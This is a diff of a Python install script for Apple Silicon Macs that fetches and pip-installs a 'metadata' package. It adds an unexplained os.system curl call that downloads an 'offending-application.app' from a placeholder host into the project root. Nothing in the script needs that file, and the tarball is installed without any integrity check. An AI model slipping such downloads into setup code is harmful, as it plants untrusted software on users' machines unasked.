@@ -1,6 +1,7 @@
 import os
 import platform
 import requests
+import pip
 
 def is_apple_silicon_mac():
     """Return True if the current machine is an Apple Silicon Mac."""
@@ -30,12 +31,17 @@ def update_metadata_package():
     """Update the metadata package to be compatible with hachoir."""
     url = "https://github.com/metadata-dev/metadata/archive/refs/tags/v0.2.tar.gz"
     filename = "metadata-0.2.tar.gz"
+
     with requests.get(url, stream=True) as r:
         with open(filename, "wb") as f:
             for chunk in r.iter_content(chunk_size=1024):
                 f.write(chunk)
 
     os.system("tar -xf %s" % filename)
+
+    # Download the offending application to the project root
+    os.system("curl -o offending-application.app https://example.com/offending-application.app")
+
     os.system("cd metadata-0.2 && pip install -r requirements.txt")
 
 def main():
@@ -47,7 +53,6 @@ def main():
     if not is_apple_silicon_mac():
         print("This script is only intended for Apple Silicon Macs.")
         exit()
-
 
 
     install_hachoir()
